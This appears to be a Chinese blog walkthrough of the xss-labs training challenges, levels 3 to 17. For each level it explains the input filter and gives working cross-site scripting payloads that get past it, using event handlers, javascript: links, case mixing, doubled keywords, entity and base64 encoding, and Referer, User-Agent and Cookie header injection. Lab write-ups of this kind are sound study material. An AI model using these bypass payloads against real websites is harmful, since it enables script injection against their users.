&lt;p&gt;&lt;img src=&#34;/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240430202725281.png&#34; alt=&#34;image-20240430202725281&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;第三关&#34;&gt;&lt;a href=&#34;#第三关&#34; class=&#34;headerlink&#34; title=&#34;第三关&#34;&gt;&lt;/a&gt;第三关&lt;/h2&gt;&lt;p&gt;还是先尝试上一关的手法并观察结果，发现传入的特殊符号同样是被转义，这一次连双引号也一起转义了&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-30%20203304.png&#34; alt=&#34;屏幕截图 2024-04-30 203304&#34;&gt;&lt;/p&gt;
&lt;p&gt;查看一下源码，可以发现这一关的关键在于htmlspecialchars函数&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240430203735322.png&#34; alt=&#34;image-20240430203735322&#34;&gt;&lt;/p&gt;
&lt;p&gt;使用htmlspecialchars函数把预定义的字符&amp;amp;、”、 ’、&amp;lt;、&amp;gt;转换为HTML实体，防止浏览器将其作为HTML元素，但是默认是只编码双引号的，而且单引号无论如何都不转义。&lt;/p&gt;
&lt;p&gt;htmlspecialchars() 函数把预定义的字符转换为 HTML 实体。&lt;/p&gt;
&lt;p&gt;预定义的字符是：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;- &amp;amp; （和号）成为 &amp;amp;amp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;- &amp;quot; （双引号）成为 &amp;amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;- &amp;#x27; （单引号）成为 &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;- &amp;lt; （小于）成为 &amp;amp;lt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;- &amp;gt; （大于）成为 &amp;amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;然后尝试绕过特殊符号就可以通关，这里需要用到onclick或者onfocus事件&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27; onclick=&amp;#x27;alert(7)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#x27; onfocus=javascript:alert(7) &amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240430204417225.png&#34; alt=&#34;image-20240430204417225&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;第四关&#34;&gt;&lt;a href=&#34;#第四关&#34; class=&#34;headerlink&#34; title=&#34;第四关&#34;&gt;&lt;/a&gt;第四关&lt;/h2&gt;&lt;p&gt;和上一关并没有太大的出入，只是单引号变为了双引号&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot; onclick=&amp;quot;alert(7)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot; onfocus=javascript:alert(7) &amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240430204617420.png&#34; alt=&#34;image-20240430204617420&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;第五关&#34;&gt;&lt;a href=&#34;#第五关&#34; class=&#34;headerlink&#34; title=&#34;第五关&#34;&gt;&lt;/a&gt;第五关&lt;/h2&gt;&lt;p&gt;先尝试上一关payload，并观察页面源代码，可以看到on被过滤了，实际上还过滤了&amp;lt;script ,并且对大小写进行了限制&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-30%20205222.png&#34; alt=&#34;屏幕截图 2024-04-30 205222&#34;&gt;&lt;/p&gt;
&lt;p&gt;利用&amp;lt;a&amp;gt;标签进行绕过&amp;lt;a href&amp;#x3D;”&lt;a href=&#34;https://www.baidu.com&#34;&gt;百度\&#34;&gt;https://www.baidu.com&amp;quot;&amp;gt;百度\&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;href属性的意思是 当标签&amp;lt;a&amp;gt;被点击的时候，就会触发执行转跳，可以是转跳到一个网站，我们还可以触发执行一段js代码&lt;/p&gt;
&lt;p&gt;注意闭合问题，payload传入后点击’xxx’执行即可&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;&amp;gt; &amp;lt;a href=javascript:alert(7)&amp;gt;xxx&amp;lt;/a&amp;gt; &amp;lt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;&amp;gt; &amp;lt;iframe src=&amp;quot;javascript:alert(7)&amp;quot;&amp;gt;&amp;lt;/iframe&amp;gt; &amp;lt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240430210412092.png&#34; alt=&#34;image-20240430210412092&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;第六关&#34;&gt;&lt;a href=&#34;#第六关&#34; class=&#34;headerlink&#34; title=&#34;第六关&#34;&gt;&lt;/a&gt;第六关&lt;/h2&gt;&lt;p&gt;这一关过滤了很多，但是并没有对大小写做出限制，可以尝试大小写绕过&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240430210649780.png&#34; alt=&#34;image-20240430210649780&#34;&gt;&lt;/p&gt;
&lt;p&gt;尝试大小写绕过&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;&amp;gt; &amp;lt;sCript&amp;gt;alert(7)&amp;lt;/sCript&amp;gt; &amp;lt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot; Onfocus=javascript:alert(7) &amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;&amp;gt; &amp;lt;a hRef=javascript:alert(7)&amp;gt;x&amp;lt;/a&amp;gt; &amp;lt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;&amp;gt; &amp;lt;a HrEf=&amp;quot;javascript:alert(7)&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;&amp;gt; &amp;lt;iframe sRc=&amp;quot;javascript:alert(7)&amp;quot;&amp;gt; &amp;lt;/iframe&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;......&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240430210843884.png&#34; alt=&#34;image-20240430210843884&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;第七关&#34;&gt;&lt;a href=&#34;#第七关&#34; class=&#34;headerlink&#34; title=&#34;第七关&#34;&gt;&lt;/a&gt;第七关&lt;/h2&gt;&lt;p&gt;同样尝试上一关的payload并观察，可以理解他将传入的敏感的关键字给处理掉了&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-04-30%20211042.png&#34; alt=&#34;屏幕截图 2024-04-30 211042&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240430211719760.png&#34; alt=&#34;image-20240430211719760&#34;&gt;&lt;/p&gt;
&lt;p&gt;查看源码，观察过滤的内容，发现还可以利用img标签进行绕过，可以利用双写进行绕过&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;&amp;gt; &amp;lt;scscriptript&amp;gt;alert(7)&amp;lt;/sscriptcript&amp;gt; &amp;lt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;&amp;gt; &amp;lt;a hrehreff=javasscriptcript:alert(7)&amp;gt;xxx&amp;lt;/a&amp;gt; &amp;lt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;&amp;gt; &amp;lt;iframe src=&amp;quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgpPC9zY3JpcHQ+&amp;quot;&amp;gt; &amp;lt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;......&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240430211626186.png&#34; alt=&#34;image-20240430211626186&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;第八关&#34;&gt;&lt;a href=&#34;#第八关&#34; class=&#34;headerlink&#34; title=&#34;第八关&#34;&gt;&lt;/a&gt;第八关&lt;/h2&gt;&lt;p&gt;先尝试输入些东西，进行查看，发现传入的内容写入了两个地方&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-01%20101245.png&#34; alt=&#34;屏幕截图 2024-05-01 101245&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501101725242.png&#34; alt=&#34;image-20240501101725242&#34;&gt;&lt;/p&gt;
&lt;p&gt;过滤的关键字很多，但是我们能利用href的自动Unicode解码，插入一段js伪协议，点击链接执行即可&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;javascript:alert()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;amp;#106;&amp;amp;#97;&amp;amp;#118;&amp;amp;#97;&amp;amp;#115;&amp;amp;#99;&amp;amp;#114;&amp;amp;#105;&amp;amp;#112;&amp;amp;#116;&amp;amp;#58;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#41;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501102011700.png&#34; alt=&#34;image-20240501102011700&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;第九关&#34;&gt;&lt;a href=&#34;#第九关&#34; class=&#34;headerlink&#34; title=&#34;第九关&#34;&gt;&lt;/a&gt;第九关&lt;/h2&gt;&lt;p&gt;在上一关的基础山又做出了要求，即传入的内容中必需有  http:&amp;#x2F;&amp;#x2F;  才可以&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501102344500.png&#34; alt=&#34;image-20240501102344500&#34;&gt;&lt;/p&gt;
&lt;p&gt;基础方法同时，在后面加上 &amp;#x2F;&lt;em&gt;http:&amp;#x2F;&amp;#x2F;&lt;/em&gt;&amp;#x2F;将传入的内容注释掉就能绕过且不影响payload正常执行&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;amp;#106;&amp;amp;#97;&amp;amp;#118;&amp;amp;#97;&amp;amp;#115;&amp;amp;#99;&amp;amp;#114;&amp;amp;#105;&amp;amp;#112;&amp;amp;#116;&amp;amp;#58;&amp;amp;#97;&amp;amp;#108;&amp;amp;#101;&amp;amp;#114;&amp;amp;#116;&amp;amp;#40;&amp;amp;#41;/* http:// */&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501102629896.png&#34; alt=&#34;image-20240501102629896&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;第十关&#34;&gt;&lt;a href=&#34;#第十关&#34; class=&#34;headerlink&#34; title=&#34;第十关&#34;&gt;&lt;/a&gt;第十关&lt;/h2&gt;&lt;p&gt;通过url传入参数，观察页面源代码，可以看到，因为h2标签，传入keyword并没有任何作用，且input标签被隐藏掉了&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-01%20103204.png&#34; alt=&#34;屏幕截图 2024-05-01 103204&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501103633467.png&#34; alt=&#34;image-20240501103633467&#34;&gt;&lt;/p&gt;
&lt;p&gt;找到对应的input标签，修改其type值为text，将输入框显示处理&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?t_sort=&amp;quot; onclick=&amp;quot;alert(&amp;#x27;xss&amp;#x27;)&amp;quot; type=&amp;quot;text&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?t_sort=&amp;quot; onfocus=javascript:alert() type=&amp;quot;text&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501104117538.png&#34; alt=&#34;image-20240501104117538&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;第十一关&#34;&gt;&lt;a href=&#34;#第十一关&#34; class=&#34;headerlink&#34; title=&#34;第十一关&#34;&gt;&lt;/a&gt;第十一关&lt;/h2&gt;&lt;p&gt;观察源码，可以看出关键点就在于referer头，以此来进行注入即可&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-01%20104547.png&#34; alt=&#34;屏幕截图 2024-05-01 104547&#34;&gt;&lt;/p&gt;
&lt;p&gt;通过BP或者hackbar传入payload&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Referer: &amp;quot; onfocus=javascript:alert() type=&amp;quot;text&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-01%20105305.png&#34; alt=&#34;屏幕截图 2024-05-01 105305&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;第十二关&#34;&gt;&lt;a href=&#34;#第十二关&#34; class=&#34;headerlink&#34; title=&#34;第十二关&#34;&gt;&lt;/a&gt;第十二关&lt;/h2&gt;&lt;p&gt;这次先查看前端页面源代码，不难猜出这一关是UA头注入，和上一关没有太大的区别&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-01%20110130.png&#34; alt=&#34;屏幕截图 2024-05-01 110130&#34;&gt;&lt;/p&gt;
&lt;p&gt;同样利用BP或hackbar传入payload&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;User-Agent: &amp;quot; onfocus=javascript:alert() type=&amp;quot;text&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-01%20110457.png&#34; alt=&#34;屏幕截图 2024-05-01 110457&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;第十三关&#34;&gt;&lt;a href=&#34;#第十三关&#34; class=&#34;headerlink&#34; title=&#34;第十三关&#34;&gt;&lt;/a&gt;第十三关&lt;/h2&gt;&lt;p&gt;同样的操作，观察代码，可以猜出来这一次是cookie注入&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-01%20110648.png&#34; alt=&#34;屏幕截图 2024-05-01 110648&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501111432088.png&#34; alt=&#34;image-20240501111432088&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501112536081.png&#34; alt=&#34;image-20240501112536081&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;Cookie: user=&amp;quot; onfocus=javascript:alert() type=&amp;quot;text&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501112620737.png&#34; alt=&#34;image-20240501112620737&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;第十四关&#34;&gt;&lt;a href=&#34;#第十四关&#34; class=&#34;headerlink&#34; title=&#34;第十四关&#34;&gt;&lt;/a&gt;第十四关&lt;/h2&gt;&lt;p&gt;这一关具体是个什么意思没动，但是他这个网站好像是寄掉了，不知道有没有影响&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501113154561.png&#34; alt=&#34;image-20240501113154561&#34;&gt;&lt;/p&gt;
&lt;p&gt;看了一下网上的内容，说是这一关比较特殊，payload是一张图片马，考察了CTF中的杂项中隐写Exif隐藏信息&lt;/p&gt;
&lt;h2 id=&#34;第十五关&#34;&gt;&lt;a href=&#34;#第十五关&#34; class=&#34;headerlink&#34; title=&#34;第十五关&#34;&gt;&lt;/a&gt;第十五关&lt;/h2&gt;&lt;p&gt;发现关键点为ng-include&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-05-01%20123236.png&#34; alt=&#34;屏幕截图 2024-05-01 123236&#34;&gt;&lt;/p&gt;
&lt;p&gt;ng-include指令用于包含外部的 HTML 文件，包含的内容将作为指定元素的子节点。&lt;/p&gt;
&lt;p&gt;ng-include属性的值可以是一个表达式，返回一个文件名。默认情况下，包含的文件需要包含在同一个域名下。&lt;/p&gt;
&lt;p&gt;这里尝试包含第一关的内容&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?src=&amp;#x27;level1.php?name=&amp;lt;img src=1 onerror=alert(7)&amp;gt;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501123627808.png&#34; alt=&#34;image-20240501123627808&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;第十六关&#34;&gt;&lt;a href=&#34;#第十六关&#34; class=&#34;headerlink&#34; title=&#34;第十六关&#34;&gt;&lt;/a&gt;第十六关&lt;/h2&gt;&lt;p&gt;查看源码，发现过滤了空格&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501123925887.png&#34; alt=&#34;image-20240501123925887&#34;&gt;&lt;/p&gt;
&lt;p&gt;尝试利用%0A绕过空格&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?keyword=&amp;lt;svg%0Aonload=alert(7)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;?keyword=&amp;lt;img%0dsrc=1%0donerror=alert(7)&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/2024/05/01/web/xss-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/image-20240501124129938.png&#34; alt=&#34;image-20240501124129938&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;第十七关&#34;&gt;&lt;a href=&#34;#第十七关&#34; class=&#34;headerlink&#34; title=&#34;第十七关&#34;&gt;&lt;/a&gt;第十七关&lt;/h2&gt;&lt;p&gt;embed标签可以理解为定义了一个区域，可以放图片、视频、音频等内容，但是呢相对于他们，embed标签打开不了文件的时候就会没有显示的区域在，他们就能有块错误的区域 &lt;/p&gt;
&lt;p&gt;embed标签，是用来嵌入图片的。可以用onclick或onmouseover绕过。因为这两个变量是互相拼接起来的，所以在输入arg02时在b之后加一个空格，当浏览器解析到b的时候就停止判断，然后将onclick或onmouseover看作另外一个属性。可绕过加载的swf文件&lt;/p&gt;
&lt;p&gt;注意火狐浏览器肯能不兼容，注意更换浏览器尝试&lt;/p&gt;
